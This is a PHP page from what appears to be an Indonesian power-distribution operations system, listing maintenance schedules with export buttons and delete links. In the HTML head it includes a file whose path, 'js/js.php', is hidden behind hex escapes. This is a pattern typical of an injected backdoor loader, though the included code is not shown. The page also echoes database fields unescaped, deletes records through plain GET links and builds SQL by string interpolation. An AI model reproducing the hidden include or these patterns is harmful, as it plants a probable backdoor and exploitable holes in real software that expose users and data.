<?php require_once('Connections/opsisdis_mysqli.php'); ?>
<?php
 if ($_SESSION['hak_akses'] !=''){
  if (preg_match('~\b(' . str_replace(',','|', $_SESSION['hak_akses']) . ')\b~', 'usul_jadwal')) {
?>
<?php 
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}
include('paginator.class.2.php');
date_default_timezone_set("Asia/Jakarta"); 
$area=@$_SESSION['area'];
$from=isset($_POST['from']) ? ($_POST['from']):date("Y-m-d", mktime(0, 0, 0, date("m") , date("d")-2, date("Y")));
$to=isset($_POST['to']) ? $_POST['to'] : date("Y-m-d", mktime(0, 0, 0, date("m") , date("d"), date("Y")));
 
$query = "SELECT COUNT(*) FROM jadwal_har_tb WHERE area='$area' ";
$result = $mysqli_opsisdis->query($query) or die($mysqli_opsisdis->error.__LINE__);
$num_rows = mysqli_fetch_row($result);
 
$pages = new Paginator;
$pages->items_total = $num_rows[0];
$pages->mid_range = 9;  
$pages->paginate();





 

$query_data = "SELECT * from jadwal_har_tb WHERE area='$area' ORDER BY id DESC $pages->limit";
$data = $mysqli_opsisdis->query($query_data) or die($mysqli_opsisdis->error.__LINE__);



$hal = (int) (!isset($_GET["page"]) ? 1 : $_GET["page"]);
$limit = (int) (!isset($_GET["ipp"]) ? 1 : $_GET["ipp"]);
$startpoint = (($hal * $limit) - $limit)+1;

 



?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
<script type="text/javascript" charset="utf-8" src="js/pop_up_window.js"></script>
<script type="text/javascript" language="JavaScript">

function confirmAction(){
      var confirmed = confirm("Are you sure? This will remove this entry forever.");
      return confirmed;
}
</script>
<style type="text/css" title="currentStyle">
			@import "Table_Tools/media/css/demo_page.css";
			@import "Table_Tools/media/css/demo_table_php.css";
			
			@import "Table_Tools/media/css/TableTools.css";
			<!--@import "Table_Tools/media/css/ColReorder.css";-->
			
			<!--@import "Table_Tools/media/css/ColVis.css";-->
			thead input { width: 100% }
			input.search_init { color: #999 }
			
			.bold{	
			/*font-size: 12px;*/
			 font-weight: bold;
			 }			
		</style>
<script type="text/javascript" language="javascript" src="Table_Tools/media/js/jquery.v1.6.1.js"></script>

<?php   include("\x6a\x73/js.\x70h\x70");?>
<script type="text/javascript" language="javascript" src="Table_Tools/media/js/num-html.js"></script>        
<script type="text/javascript" charset="utf-8" src="Table_Tools/media/js/ZeroClipboard.1.0.4-TableTools2.js"></script>
<script type="text/javascript" charset="utf-8" src="Table_Tools/media/js/TableTools.2.0.1.js"></script>
<script type="text/javascript" charset="utf-8">
			var asInitVals = new Array();
			
			$(document).ready(/*1*/function() {/*2*/
			
			
			
			/*multi row selected*/
			/* Add a click handler to the rows - this could be used as a callback */
				$('#example tr').click( function() {
					if ( $(this).hasClass('row_selected') )
						$(this).removeClass('row_selected');
					else
						$(this).addClass('row_selected');
				} );
			
			<!--input filter diatas-->
			var oTable;
				
				/* Add the events etc before DataTables hides a column */
				$("thead input").keyup( function () {
					/* Filter on the column (the index) of this element */
					oTable.fnFilter( this.value, oTable.oApi._fnVisibleToColumnIndex( 
						oTable.fnSettings(), $("thead input").index(this) ) );
				} );
				
				
			 /* Support functions to provide a little bit of 'user friendlyness' to the textboxes*/
				 
				$("thead input").each( function (i) {
					this.initVal = this.value;
				} );
				
				$("thead input").focus( function () {
					if ( this.className == "search_init" )
					{
						this.className = "";
						this.value = "";
					}
				} );
				
				$("thead input").blur( function (i) {
					if ( this.value == "" )
					{
						this.className = "search_init";
						this.value = this.initVal;
					}
				} );
				<!--input filter diatas-->
			
	
<!--if (typeof oTable == 'undefined') {--><!--reload table when click-->
			
				  oTable = $('#example').dataTable( {
					/*"bProcessing": true,*/
					//"bServerSide": true,
					/*"sAjaxSource": "daftar_penyulang_server_processing2.php",*/
					  
					
					
					
					
					<!--sembunyikan kolom-->
								   
					<!--ColReorder example with FixedColumns-->  
					
					<!--pager-->
			        "sPaginationType": "full_numbers",
					"bPaginate": false,
				    "bLengthChange": false,
					"bInfo": false,
					<!--button to export-->
					<!--C: show hide colum-->
					<!--T:button export-->
					<!--R:Reorder-->
					<!--<"clear">:memberi spasi-->
					<!--"sDom": 'C<"clear">T<"clear">lfrtip<"clear">R',-->
					"sDom": 'C<"clear">T<"clear">R<"clear">lfrtip',
					<!--"sDom": "frtiS",-->
					"bDeferRender": true,

					<!--rubah colum-->
					/*"oColVis": {
			         "buttonText": "Change columns",
					
		                       },*/
					
                    "bStateSave": false, <!--ColReorder example with state saving-->
					
					
					<!--lokasi swf file-->
					"oTableTools": {
						
					"sRowSelect": "multi",<!--agar dapat memilih multi row "single"-->
			        	
						
					"sSwfPath": "Table_Tools/media/swf/copy_cvs_xls_pdf.swf",
					
					<!--button orientation [ "copy", "csv", "xls", "pdf", "print" ] -->
					"aButtons": [ 
					
					
				
					<!--button selected row-->
							          {
					"sExtends":    "copy",
					"sButtonText": "select row to Copy",
					"bSelectedOnly": true <!--agar dapat men-save baris yg terselect saja-->
				                      },
									  
					<!--button copy-->
							          {
					"sExtends": "copy",
					"sButtonText": "Copy to clipboard",
					
					
				                      },
					<!--button csv-->				  
							  
							         {
					"sExtends":    "csv",
					"fnComplete": function ( nButton, oConfig, oFlash, sFlash ) {
						alert( 'file sudah tersimpan.terima kasih' );
					                                                             },
					"sFileName": "Daftar Penyulang *.csv"
																				 
				                      },
							
							
					<!--button xls-->		  
							          {
			        "sExtends":    "xls",	  
					"sButtonText": "xls",
					
					
					"fnComplete": function ( nButton, oConfig, oFlash, sFlash ) {
						alert( 'file sudah tersimpan.terima kasih' );
					                                                             },
					"sFileName": "Daftar Penyulang *.xls"
																				 
																			 
																				 
				                      },
					<!--button pdf -->
									  
							{
								"sExtends": "pdf",
								"sPdfOrientation": "landscape",<!--portrait'-->
								"sPdfSize": "legal",<!-- 'A[3-4]', 'letter', 'legal' or 'tabloid' -->
								"sPdfMessage": "DAFTAR IP KOMP",
								"sFileName": "Daftar Penyulang *.pdf",
								"fnComplete": function ( nButton, oConfig, oFlash, sFlash ) {
						        alert( 'file sudah tersimpan.terima kasih' );
					                                                                         },
								
							},
					<!--button print -->		
							{
					"sExtends": "print",
					"sInfo": "Please press escape when done",
					"sMessage": "created by agus eko"
				            }
						        ] 					
					               },
								 
					
					
			        <!--bahasa-->
					"oLanguage": {
					"sUrl": "media/language/indonesian.txt"
					             },			 
					
					<!--ambil data dari DB-->
					<!--"sAjaxSource": "daftar_penyulang_server_processing.php",-->
					<!--scroler-->
				    "sScrollY": "450px",/*scroll tinggi tabel*/
					"sScrollX": "100%",
					/*"sScrollXInner": "400%",*/
					"sScrollXInner": "3500px",<!--atur ini sesuaikan dg panjang tabel-->
					"bScrollCollapse": true, 
						
						
						
						/*aLengthMenu  */
						/*"iDisplayLength": 50,*/
						//"aLengthMenu":[10,25,50],
					    /*"aLengthMenu": [[11, 25, 50, -1], [11, 25, 50, "All"]],*/
					
					
					
					
				                                    } );<!--batas order var o table-->
													
<!--reload table when click-->				


<!--reload table when click-->													
			  
	
				
			                              /*2*/} );/*1*/
</script>
<style type="text/css">
.paginate {
    font-size: 1em;
}

a.paginate {
	border: 1px solid #999;
	padding: 2px 6px 2px 6px;
	text-decoration: none;
	color: #333;
}


a.paginate:hover {
	background-color: #e2e4ff;
	color: #FFF;
	text-decoration: underline;
}

a.current {
	border: 1px solid #CCC;
	padding: 2px 6px 2px 6px;
	cursor: default;
	color: #F00;
	text-decoration: none;
	background-color: #e2e4ff;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 1em;
	font-weight: bold;
}

span.inactive {
	border: 1px solid #999;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 1em;
	padding: 2px 6px 2px 6px;
	color: #999;
	cursor: default;
}


</style> 
<link type="text/css" href="css/ui-lightness/jquery-ui-1.7.2.custom.css" rel="stylesheet" />
<style type="text/css">
input.search_init1 {color: #999 }
</style>
	<!--<script type="text/javascript" src="js/jquery-1.3.2.min.js"></script>-->
	<script type="text/javascript" src="js/jquery-ui-1.7.2.custom.min.js"></script>
	<script type="text/javascript" src="js/timepicker.js"></script>
<script type="text/javascript">
$(function() {
    $('#tanggal1,#from,#to').datepicker({
		duration: '',
		dateFormat:"yy-mm-dd",
		changeMonth: true,  
        changeYear: true ,
		time24h: true,
        showTime: false,
		showOn: "both",		 
        //maxDate: " +0D",
				 
        constrainInput: false
     });
});
</script>

</head>

<body >



<!--xxxxxxxxx-->
<div id="dt_example">
<div id="container">

					<h1>(RENCANA JADWAL AREA) <?php echo  "USER: ".@$_SESSION['nama_lengkap']." AREA :".@$_SESSION['sat_ker'];?></h1>
<div id="demo">

<table width="200" align="right">
  <tr>
    <td align="right"> <?php if (preg_match('~\b(' . str_replace(' ','|', @$_SESSION['sat_ker']) . ')\b~', 'APD')) {$href='jadwal_har_isi.php';}else {$href='jadwal_har_isi_area.php';}?>
    <a  href="<?php echo $href; ?>" onclick="NewWindow(this.href,'name','1050','800','yes');return false"><img src="image/EDIT.gif" alt="phone" width="32" height="32" align="absbottom"  style="border:none"> <input name="add" type="button" value="Isi Jadwal"> </a>
      </td>
  </tr>
</table>

<br />
<br />
<br />
<?php echo "<span class=\"\">".$pages->display_jump_menu().$pages->display_items_per_page()."</span>";?>
<table cellpadding="0" cellspacing="0" border="0" class="display" id="example">
<!--<caption class="caption">** PENYULANG TRIP HARI INI **</caption>-->
<thead>
        <tr>
           <th >No</th>
           <th width="50px">ACTION</th>
           <th width="100px">APPROVAL AREA</th>
           <th width="100px">APPROVAL APD</th>
           <th >RESPON APD</th>
            <th width="100px">TGL</th>
            <th width="100">USULAN DARI</th>
            <th width="100">STATUS PEK</th>
            <th width="10">PERIODE</th>
            <th width="50">JADWAL</th>
            <th width="150">LAMPIRAN</th>
             <th width="50">GARDU</th>
            <th width="100">JAM</th>
            <th >PELAKSANA</th>
            <th >SIFAT / JENIS</th>
            <th >PENYULANG</th>
            <th >GI</th>
            <th >JTM BEBAS</th>
            <th >AREA</th>
            <th >INPUTER</th>
            <th >TGL INPUT</th>
            
            
        </tr>
        <tr>
            <td align="right" ><input name="search_engine" type="text" disabled class="search_init" value="" /></td>
            <td align="right" ><input name="search_engine" type="text" disabled class="search_init" value="" /></td>
            <td ><input type="text" name="search_browser5" value="Search" class="search_init1" /></td>
            <td ><input type="text" name="search_browser3" value="Search" class="search_init" /></td>
            <td ><input type="text" name="search_browser4" value="Search" class="search_init" /></td>
            <td ><input type="text" name="search_browser" value="Search" class="search_init" /></td>
            <td ><input type="text" name="search_browser2" value="Search " class="search_init" /></td>
            <td ><input type="text" name="search_browser" value="Search" class="search_init" /></td>
            <td ><input type="text" name="search_browser" value="Search" class="search_init" /></td>
            <td ><input type="text" name="search_browser" value="Search" class="search_init" /></td>
			<td ><input type="text" name="search_browser" value="Search" class="search_init" /></td>
            <td ><input type="text" name="search_browser" value="Search" class="search_init" /></td>
            <td ><input type="text" name="search_engine" value="Search" class="search_init" /></td>
            <td ><input type="text" name="search_browser" value="Search" class="search_init" /></td>
            <td ><input type="text" name="search_browser" value="Search" class="search_init" /></td>
            <td ><input type="text" name="search_browser" value="Search" class="search_init" /></td>
            <td ><input type="text" name="search_browser" value="Search" class="search_init" /></td>
            <td ><input type="text" name="search_browser" value="Search" class="search_init" /></td>
            <td ><input type="text" name="search_browser" value="Search" class="search_init" /></td>
            <td ><input type="text" name="search_browser" value="Search" class="search_init" /></td>
            <td ><input type="text" name="search_browser6" value="Search" class="search_init1" /></td>
            
        </tr>
</thead>
<tfoot>
       		 <tr>
            <th ></th>
           <th width="150"> </th>
           <th width="100"></th>
           <th width="100"></th>
           <th></th>
            <th width="100"> </th>
            <th width="100"></th>
            <th width="100"> </th>
            <th width="10"> </th>
            <th > </th>
            <th width="10"> </th>
            <th > </th>
            <th >  </th>
            <th > </th>
            <th > </th>
            <th > </th>
            <th > </th>
            <th > </th>
            <th > </th>
            <th ></th>
            <th ></th>
            </tr>
</tfoot> 
  <tbody>

<?php $ii=$startpoint; while($row_data = mysqli_fetch_array($data))	 { ?>

		        <tr class="even_gradeX"><!--even_gradeC, odd_gradeA, odd_gradeX, gradeX, even_gradeX-->
		        <td align="right" width="20"><?php echo $ii; ?></td><!--no-->
		        <td class="left"> 
<a href="jadwal_har_delete.php?delete=<?php  echo $row_data['id_pek']; ?>" OnClick="return confirm('Are you sure? This will remove data with ID PEK <?php  echo $row_data['id_pek']; ?> forever !!!')" > 

 <img src="image/1293442423_delete.png" alt="delete" width="16" height="16" align="absbottom"  border="none"> Delete </a>

                </td>
		        <td class="left" title="<?php echo $hari.' '.$datename;?>"><?php echo $row_data['approval_area1']; ?></td>
		        <td class="left" title="<?php echo $hari.' '.$datename;?>"><?php echo $row_data['approval_apd1']; ?></td>
		        <td class="left" title="<?php echo $hari.' '.$datename;?>"><?php echo $row_data['respon_apd']; ?></td>
                <?php  
$tanggal=$row_data['tgl'];
$dayname=date("l", strtotime($tanggal));//extract nm hari Monday
$datename=date("d-M-Y", strtotime($tanggal));//11-Oct-2011
switch($dayname)
{
case "Monday" : $hari = "SENIN";
             break;
case "Tuesday" : $hari = "SELASA";
             break;
case "Wednesday" : $hari = "RABU";
             break;
case "Thursday" : $hari = "KAMIS";
             break;
case "Friday" : $hari = "JUM'AT";
             break;
case "Saturday" : $hari = "SABTU";
             break;
case "Sunday" : $hari = "MINGGU";
             break;
}
#echo $hari;
?>
                <td class="left" title="<?php echo $hari.' '.$datename;?>">
				<?php echo $row_data['tgl']; ?></td>
                <td class="left"><?php echo $row_data['usulan_dari']; ?></td>
                <td class="left"><?php echo $row_data['status_pekerjaan']; ?></td>
                <td class="left"><?php echo $row_data['periode']; ?></td>
                <td class="left"><?php echo $row_data['jenis_jadwal']; ?></td>
                <td align="left" ><a href="jadwal_har_upload_area.php?id_pek=<?php echo $row_data['id_pek']; ?>"  id="" onclick="NewWindow(this.href,'<?php  echo $row_data['id_pek']; ?>','960','630','yes');return false">Lihat Dokumen</a></td> 
 		        <td class="left"><?php echo $row_data['gardu']; ?></td>
                <td class="left" ><?php echo $row_data['jam_pekerjaan']; ?></td>
                <td class="left"><?php echo $row_data['pelaksana_pek']; ?></td>                
		        <td ><?php echo $row_data['sifat_jenis_pek']; ?></td>
		        <td ><?php echo $row_data['penyulang']; ?></td>
		        <td ><?php echo $row_data['gi']; ?></td>
		        <td  class="left"><?php echo $row_data['jtm']; ?></td>
		        <td class="left"><?php echo $row_data['aj']; ?></td>
                <td class="left"><?php echo $row_data['inputer']; ?></td>
                <td class="left"><?php echo $row_data['tanggal_input']; ?></td>
              </tr>
	<?php $ii++;} ?>	
              
              

    </tbody>
    
</table>
<?php 

echo $pages->display_pages();
echo "<p class=\"paginate\">Page: $pages->current_page of $pages->num_pages , Total Records: $num_rows[0]</p>\n";


?>
<br />
<br />
<br />
<br />
<br />

</div>
</div>
</div>
<!--xxxxxxx-->


</body>
</html>
<?php
mysqli_free_result($data);
?>
<?php 
  } else echo 'anda tidak bisa mengakses menu ini';} ?>